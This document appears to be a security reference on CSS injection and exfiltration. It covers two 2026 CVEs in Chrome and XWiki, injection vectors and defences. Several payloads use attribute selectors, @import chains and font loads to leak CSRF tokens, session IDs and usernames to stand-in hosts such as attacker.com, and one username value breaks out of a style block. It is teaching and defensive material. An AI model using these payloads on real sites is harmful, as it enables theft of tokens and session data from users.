# CSS Injection and Data Exfiltration

> **Category:** Client-Side Injection  
> **Language:** CSS / JavaScript  
> **Severity:** Medium to High  
> **CVEs covered:** CVE-2026-2441 (Chrome CSS Blink), CVE-2026-26000 (XWiki CSS Injection), CVE-2024-5907 (various CSS injection chains)

## Overview

CSS injection is often underestimated as a "harmless" vulnerability — after all, CSS can't execute code, right? Wrong. CSS can:

1. **Exfiltrate sensitive data** via attribute selectors and URL-backed properties
2. **Bypass Content Security Policy** (since CSS is trusted more than JS)
3. **Create timing oracles** via CSS animations and resource loading
4. **Perform cross-site search** via `@import` with URL fragments
5. **Leak CSRF tokens** character-by-character using attribute selectors

CSS attacks work by using CSS selectors as **oracles**: a selector either matches (loading a resource) or doesn't match (no request), creating a binary side channel.

---

## CVE-2026-2441: Chrome CSS Blink Exfiltration

**CVSS:** 6.5 (Medium)  
**Source:** https://www.sitepoint.com/zero-day-css-cve-2026-2441-security-vulnerability/

### Description

CVE-2026-2441 was a zero-day CSS exfiltration vulnerability in Chrome's Blink rendering engine that allowed attackers to steal sensitive DOM content — such as CSRF tokens — by chaining `@import` redirects and attribute selectors to trigger sequential network requests to attacker-controlled servers, **all without executing any JavaScript**.

### Anatomy of the Exploit

The attack uses CSS attribute selectors as an oracle:

```css
/* CSS Oracle: test if a secret starts with a given character */
/* For an input element: <input type="hidden" value="secret_token_abc123"> */

/* Test if value starts with 'a' */
input[name="csrf_token"][value^="a"] {
  background: url(http://attacker.com/leak?char=a);
}

/* Test if value starts with 'b' */
input[name="csrf_token"][value^="b"] {
  background: url(http://attacker.com/leak?char=b);
}
/* ... and so on for all possible characters */
```

When the browser renders the CSS, it:
1. Checks if `value^="a"` matches
2. If yes, makes a request to `attacker.com/leak?char=a`
3. Attacker logs the request, confirming the first character
4. The process is repeated for subsequent characters using `value^="ab"`, `value^="ac"`, etc.

### CVE-2026-2441 Specific Bypass

What made CVE-2026-2441 special was that it bypassed standard CSP protections:

```css
/* Even with strict CSP: script-src 'self'; style-src 'self' */
/* This CSS still works because style-src 'self' allows the page's own styles */

/* The vulnerability used @import chaining to bypass restrictions */
@import url('http://attacker.com/phase1.css');
```

The `@import` directive allowed loading external resources even in contexts where `url()` was restricted. Chrome's Blink engine did not properly validate the redirect chain during `@import` processing.

### Proof of Concept (Simplified)

```html
<!-- Attacker injects this <style> or <link> into the page -->
<style>
  /* Character-by-character extraction of CSRF token */
  @import url('http://attacker.com/start');
</style>

<!-- On attacker.com/start, they serve CSS that tests characters: -->
<!-- attacker.com/start  -->
/* First char: test if token starts with a-m */
input[name="_token"][value^="a"] ~ * { background: url(/leak?a); }
input[name="_token"][value^="b"] ~ * { background: url(/leak?b); }
/* ... */
```

### Why Traditional Defenses Failed

1. **CSP `style-src 'self'`** → allowed the injected CSS (same origin)
2. **`@import`** → not blocked by standard CSP directives in older Chrome versions
3. **No JavaScript required** → XSS detection tools missed it
4. **Stealth** → no console errors, no DOM mutation that security tools track

### Patched Versions

- Chrome ≥ 145.0.7632.75
- All Chromium-based browsers (Edge, Brave, Opera) pulled the upstream fix

**References:**
- https://www.sitepoint.com/zero-day-css-cve-2026-2441-security-vulnerability/
- https://chromereleases.googleblog.com/2026/02/stable-channel-update-for-desktop_13.html

---

## CVE-2026-26000: XWiki CSS Injection

**CVSS:** 5.4 (Medium)  
**Source:** https://www.sentrium.co.uk/labs/disclosure-xwiki-css-injection-cve-2026-26000

### Description

XWiki (an open-source wiki platform) had a CSS injection vulnerability that allowed attackers with minimal privileges to inject arbitrary CSS into wiki pages. While XWiki's security model blocked JavaScript injection, it did not block CSS — creating a data exfiltration channel.

### Vulnerable Entry Point

```javascript
// XWiki allowed users to customize page themes with CSS
// The CSS input was sanitized for JS but NOT for CSS injection

// User-supplied CSS (injected via "Customize Theme"):
// VULNERABLE: XWiki rendered this CSS without sanitization
.user-mention[data-user^="a"]::after {
  content: url('http://attacker.com/exfil?user=a');
}
.user-mention[data-user^="b"]::after {
  content: url('http://attacker.com/exfil?user=b');
}
```

### Exploitation

1. Attacker with "edit theme" privileges injects CSS with attribute selectors
2. Every page visitor leaks their user information through CSS attribute matching
3. The `content: url()` loads attacker-controlled URLs
4. Attacker reconstructs user data from URL patterns

### Fix

```javascript
// XWiki applied CSP restrictions to style-src and sanitized CSS properties
// Content-Security-Policy: style-src 'self' 'nonce-xxx';
// No url() or @import allowed from user-controlled CSS
```

**References:**
- https://www.sentrium.co.uk/labs/disclosure-xwiki-css-injection-cve-2026-26000

---

## CSS Injection Vectors

### Vector 1: Inline Styles

```html
<!-- VULNERABLE: User input in style attribute -->
<div style="background-image: url('<?= $userInput ?>')">

<!-- Malicious input: -->
x'); } input[name="csrf"][value^="a"] { background: url(http://attacker/?a); }
```

### Vector 2: `<style>` Tag Injection

```html
<!-- VULNERABLE: User-controlled content in style block -->
<style>
  .user-<?= $username ?> { color: red; }
</style>

<!-- Attacker registers username: -->
x} @import url('http://attacker.com/exfil'); /*

<!-- Renders as: -->
<style>
  .user-x} @import url('http://attacker.com/exfil'); /* { color: red; }
</style>
```

### Vector 3: CSS-in-JS Unsanitized

```javascript
// VULNERABLE: CSS-in-JS with user-controlled values
import styled from 'styled-components';

const UserBox = styled.div`
  background: ${props => props.userColor};
`;

// Attacker provides: url(http://attacker.com/leak)
// CSS exfiltration achieved through computed styles
```

### Vector 4: SVG CSS Injection

```html
<!-- SVG allows embedded CSS -->
<svg>
  <style>
    /* This CSS can read attributes of SVG elements */
    text[data-secret^="a"] { fill: url(http://attacker.com/a); }
  </style>
  <text data-secret="sensitive_value">X</text>
</svg>
```

---

## CSS Exfiltration Techniques

### Technique 1: Attribute Value Extraction

```css
/* Extract value of hidden input fields */
input[name="session_id"][value^="a"] { background: url(/leak?a); }
input[name="session_id"][value^="b"] { background: url(/leak?b); }
/* ... 52 characters (a-zA-Z) × value length requests */
```

### Technique 2: Font-Based Leak (CSS Font Loading)

```css
/* Check if specific text exists using @font-face */
@font-face {
  font-family: 'leak-a';
  src: url(http://attacker.com/leak?exists=admin);
  unicode-range: U+41;  /* 'A' */
}

/* Apply font to target element */
body { font-family: 'leak-a', sans-serif; }
/* Browser downloads the font if 'A' is rendered -> existence confirmed */
```

### Technique 3: Scrollbar-Based Leak

```css
/* Detect content overflow with custom scrollbar */
#target:has(> :nth-child(100)) {
  scrollbar-width: thin;
  /* Attacker observes timing difference from scrollbar rendering */
}
```

### Technique 4: @import Redirect Chain

```css
/* Use sequential @import to test each character */
@import url('http://attacker.com/check?pos=1');
/* Server responds with CSS for testing position 2 based on result */
```

---

## Prevention

### Defense 1: Content Security Policy

```html
<!-- STRICT CSP that prevents CSS exfiltration -->
<meta http-equiv="Content-Security-Policy" content="
  style-src 'nonce-abc123' 'unsafe-inline';  <!-- Use nonce, not unsafe-inline -->
  img-src 'self';                             <!-- Block external image loads -->
  font-src 'self';                            <!-- Block external font loads -->
  connect-src 'self';                         <!-- Block fetch/XHR -->
">
```

**Key CSP rules that block CSS exfiltration:**

| Directive | Setting | Effect |
|-----------|---------|--------|
| `style-src` | `'nonce-xxx'` (not `'unsafe-inline'`) | Blocks injected `<style>` blocks |
| `img-src` | `'self'` | Blocks `url()` image exfiltration |
| `font-src` | `'self'` | Blocks `@font-face` exfiltration |
| `connect-src` | `'self'` | Blocks CSS fetch-based attacks |

### Defense 2: Input Sanitization

```javascript
// Sanitize CSS input to block exfiltration vectors
function sanitizeCSS(input) {
  return input
    .replace(/url\(/gi, 'url(about:blank)')  // Block url() 
    .replace(/@import/gi, '/* @import blocked */')  // Block @import
    .replace(/expression\(/gi, '')  // Block IE expressions
    .replace(/javascript:/gi, '')  // Block pseudo-protocols
    .replace(/[\\"']/g, '');  // Remove quotes that could break out
}

// Better: use a CSS parser/validator
import { parse, stringify } from 'css';

function validateCSS(input) {
  const ast = parse(input);
  // Walk AST and verify no prohibited properties
  // ...
  return stringify(ast);
}
```

### Defense 3: Trusted Types

```typescript
// Trusted Types prevent CSS injection at the browser level
// By enforcing that CSS values come from trusted functions

// In supported browsers, enable:
// Content-Security-Policy: require-trusted-types-for 'style';

// Create a trusted CSS policy:
interface CSSPolicy {
  createCSS(css: string): TrustedCSS;
}

const sanitizer: CSSPolicy = trustedTypes.createPolicy('sanitizer', {
  createCSS: (css: string) => sanitizeCSS(css),
});

// Now this would be BLOCKED without the trusted type:
// element.style.cssText = userInput;  // TypeError!

// This is allowed:
element.style.cssText = sanitizer.createCSS(userInput) as unknown as string;
```

### Defense 4: Runtime Detection

```javascript
// Monitor for unexpected CSS resource loads
const originalFetchCSS = window.fetch;

// Observe performance entries for stylesheet loads
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.initiatorType === 'css' && !isAllowedOrigin(entry.name)) {
      console.warn('Suspicious CSS load detected:', entry.name);
      // Alert security team
    }
  }
});
observer.observe({ entryTypes: ['resource'] });
```

---

## References

1. https://www.sitepoint.com/zero-day-css-cve-2026-2441-security-vulnerability/ — CVE-2026-2441 CSS exfiltration deep dive
2. https://www.sentrium.co.uk/labs/disclosure-xwiki-css-injection-cve-2026-26000 — XWiki CSS injection
3. https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection — OWASP CSS injection testing
4. https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering — CSS + service worker chains
5. https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API — Trusted Types API
6. https://jspm.org/js-integrity-with-import-maps — JS integrity with import maps
